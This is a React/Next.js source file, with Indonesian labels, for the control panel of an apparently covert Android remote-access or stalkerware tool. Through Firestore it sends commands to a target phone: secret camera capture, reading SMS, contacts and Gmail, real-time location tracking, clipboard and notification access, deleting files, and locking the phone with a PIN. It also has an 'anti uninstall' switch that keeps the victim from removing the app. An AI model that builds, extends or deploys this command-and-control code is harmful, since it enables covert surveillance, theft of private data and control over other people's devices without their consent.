'use client';
import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { collection, onSnapshot, addDoc, serverTimestamp, query, orderBy, doc, updateDoc } from 'firebase/firestore';
import { db, auth } from '../../firebase';
import { onAuthStateChanged } from 'firebase/auth';
import { useRouter } from 'next/navigation';
import BottomNav from '../../../components/BottomNav';
import { Battery, Signal, Shield, Camera, MessageSquare, Phone, MapPin, Wifi, Bell, Clipboard, AppWindow, Folder, Vibrate, Globe, Flashlight, Volume2, Image as ImageIcon, Video, Lock, FileText, Send, ToggleLeft, ToggleRight } from 'lucide-react';
import Swal from 'sweetalert2';
import { motion } from 'framer-motion';

const features = [
  { icon: Camera, name: 'KAMERA', desc: 'Buka kamera sembunyi / dengan layar', type: 'camera' },
  { icon: MessageSquare, name: 'SMS BARU', desc: 'Kirim SMS baru', type: 'sms_new' },
  { icon: FileText, name: 'SMS LAMA', desc: 'Lihat semua SMS', type: 'sms_old' },
  { icon: Phone, name: 'KONTAK', desc: 'Daftar kontak lengkap', type: 'contacts' },
  { icon: Phone, name: 'PANGGILAN', desc: 'Panggil nomor', type: 'call' },
  { icon: MessageSquare, name: 'GMAIL', desc: 'Baca email', type: 'gmail' },
  { icon: MapPin, name: 'LOKASI', desc: 'Lacak lokasi real-time', type: 'location' },
  { icon: Wifi, name: 'JARINGAN', desc: 'WiFi / Kuota', type: 'network' },
  { icon: Bell, name: 'NOTIFIKASI', desc: 'Semua notifikasi', type: 'notifications' },
  { icon: Clipboard, name: 'CLIPBOARD', desc: 'Isi clipboard', type: 'clipboard' },
  { icon: AppWindow, name: 'APLIKASI', desc: 'Akses aplikasi sembunyi', type: 'apps' },
  { icon: Folder, name: 'FILE MANAGER', desc: 'Download / hapus file', type: 'file_manager' },
  { icon: Vibrate, name: 'GETARKAN PONSEL', desc: 'Vibrate sekarang', type: 'vibrate' },
  { icon: Globe, name: 'BUKA WEBSITE', desc: 'Buka URL', type: 'open_url' },
  { icon: Flashlight, name: 'NYALAKAN SENTER', desc: 'Senter ON', type: 'flashlight' },
  { icon: Volume2, name: 'KIRIM SUARA & VN', desc: 'Putar musik / VN', type: 'audio' },
  { icon: ImageIcon, name: 'UBAH WALLPAPER', desc: 'Ganti wallpaper', type: 'wallpaper' },
  { icon: Lock, name: 'KUNCI HP', desc: 'Kunci dengan PIN', type: 'lock' },
  { icon: ImageIcon, name: 'FOTO', desc: 'Galeri foto', type: 'photos' },
  { icon: Video, name: 'VIDEO', desc: 'Galeri video', type: 'videos' },
];

export default function PanelControl() {
  const { deviceId } = useParams() as { deviceId: string };
  const [messages, setMessages] = useState<any[]>([]);
  const [newMessage, setNewMessage] = useState('');
  const [antiUninstall, setAntiUninstall] = useState(false);
  const [device, setDevice] = useState<any>(null);
  const router = useRouter();

  useEffect(() => {
    const unsub = onAuthStateChanged(auth, (u) => {
      if (!u) router.push('/');
    });
    return unsub;
  }, [router]);

  useEffect(() => {
    const deviceRef = doc(db, 'devices', deviceId);
    const unsubDevice = onSnapshot(deviceRef, (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        setDevice(data);
        setAntiUninstall(data.antiUninstall || false);
      }
    });
    return unsubDevice;
  }, [deviceId]);

  useEffect(() => {
    const q = query(collection(db, `devices/${deviceId}/messages`), orderBy('timestamp', 'asc'));
    const unsubChat = onSnapshot(q, (snap) => {
      setMessages(snap.docs.map(doc => ({ id: doc.id, ...doc.data() })));
    });
    return unsubChat;
  }, [deviceId]);

  const toggleAntiUninstall = async () => {
    const newValue = !antiUninstall;
    setAntiUninstall(newValue);
    await updateDoc(doc(db, 'devices', deviceId), { antiUninstall: newValue });
    Swal.fire({
      title: newValue ? 'ANTI UNINSTALL AKTIF' : 'ANTI UNINSTALL NONAKTIF',
      text: newValue ? 'APK di HP kedua sekarang TIDAK BISA dihapus' : 'APK boleh dihapus',
      icon: 'success',
      confirmButtonColor: '#6366f1'
    });
  };

  const sendCommand = async (type: string, payload: any = {}) => {
    await addDoc(collection(db, `devices/${deviceId}/commands`), {
      type,
      payload,
      timestamp: serverTimestamp(),
      status: 'pending'
    });
  };

  const handleFeature = async (feature: any) => {
    await sendCommand(feature.type);
    Swal.fire({
      title: feature.name,
      text: 'Perintah dikirim realtime ke HP!',
      icon: 'success',
      confirmButtonColor: '#6366f1'
    });
  };

  const sendMessage = async () => {
    if (!newMessage.trim()) return;
    await addDoc(collection(db, `devices/${deviceId}/messages`), {
      text: newMessage,
      from: 'user',
      timestamp: serverTimestamp()
    });
    setNewMessage('');
  };

  return (
    <>
      <div className="max-w-md mx-auto bg-white min-h-screen pb-20">
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="bg-gradient-to-r from-indigo-600 to-purple-600 px-6 py-6 text-white sticky top-0 z-10">
          <div className="flex items-center gap-3">
            <motion.div whileHover={{ rotate: 15 }} className="w-12 h-12 bg-white/20 rounded-2xl flex items-center justify-center text-3xl">📱</motion.div>
            <div className="flex-1">
              <h1 className="text-2xl font-bold">{device?.model || 'Realme RMX3939'}</h1>
              <p className="text-sm opacity-80">Android 15 • Indonesia</p>
            </div>
            <div className="text-right">
              <div className="flex items-center gap-1 text-green-300">
                <div className="w-3 h-3 bg-green-300 rounded-full animate-pulse" /> ONLINE
              </div>
            </div>
          </div>
          <div className="grid grid-cols-4 gap-4 mt-8 text-center text-xs">
            <div><Battery className="mx-auto mb-1" /> {device?.battery || '87'}%</div>
            <div><Signal className="mx-auto mb-1" /> {device?.signal || '4G'}</div>
            <div><Shield className="mx-auto mb-1" /> ON</div>
            <div className="text-green-300 font-medium">TERHUBUNG</div>
          </div>
        </motion.div>

        <div className="p-6 grid grid-cols-2 gap-4">
          {features.map((f, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: i * 0.05 }}
              whileHover={{ scale: 1.05 }}
              onClick={() => handleFeature(f)}
              className="card bg-white border border-gray-100 rounded-3xl p-6 text-center cursor-pointer shadow"
            >
              <f.icon className="mx-auto w-9 h-9 text-indigo-600 mb-3" />
              <p className="font-semibold text-sm">{f.name}</p>
              <p className="text-xs text-gray-500 mt-1">{f.desc}</p>
            </motion.div>
          ))}
        </div>

        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mx-6 mt-2 bg-white border border-gray-200 rounded-3xl p-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Shield className="w-8 h-8 text-indigo-600" />
              <div>
                <p className="font-semibold">ANTI UNINSTALL ACTIVE</p>
                <p className="text-xs text-gray-500">Lindungi APK dari penghapusan</p>
              </div>
            </div>
            <button onClick={toggleAntiUninstall} className="flex items-center gap-2">
              {antiUninstall ? <ToggleRight className="w-12 h-12 text-green-500" /> : <ToggleLeft className="w-12 h-12 text-gray-400" />}
            </button>
          </div>
        </motion.div>

        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mx-6 mt-6 bg-white border border-gray-200 rounded-3xl overflow-hidden shadow">
          <div className="bg-gray-50 px-5 py-3 border-b flex items-center justify-between text-sm font-medium">
            <span>CHAT CHANNEL</span>
            <span className="text-green-600 flex items-center gap-1">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" /> ONLINE (HP TERKUNCI)
            </span>
          </div>
          <div className="h-72 overflow-y-auto p-5 space-y-4 bg-gray-50">
            {messages.map(msg => (
              <motion.div
                key={msg.id}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className={`flex ${msg.from === 'user' ? 'justify-end' : 'justify-start'}`}
              >
                <div className={`max-w-[75%] px-5 py-3 rounded-3xl ${msg.from === 'user' ? 'bg-indigo-600 text-white rounded-br-none' : 'bg-white rounded-bl-none'}`}>
                  <p>{msg.text}</p>
                </div>
              </motion.div>
            ))}
          </div>
          <div className="p-4 border-t bg-white flex gap-3">
            <input
              value={newMessage}
              onChange={e => setNewMessage(e.target.value)}
              onKeyPress={e => e.key === 'Enter' && sendMessage()}
              placeholder="Ketik pesan ke HP kedua..."
              className="flex-1 border border-gray-200 rounded-3xl px-6 py-4 focus:outline-none focus:border-indigo-500"
            />
            <motion.button whileTap={{ scale: 0.9 }} onClick={sendMessage} className="bg-indigo-600 text-white w-12 h-12 rounded-3xl flex items-center justify-center">
              <Send className="w-6 h-6" />
            </motion.button>
          </div>
        </motion.div>
      </div>
      <BottomNav />
    </>
  );
}
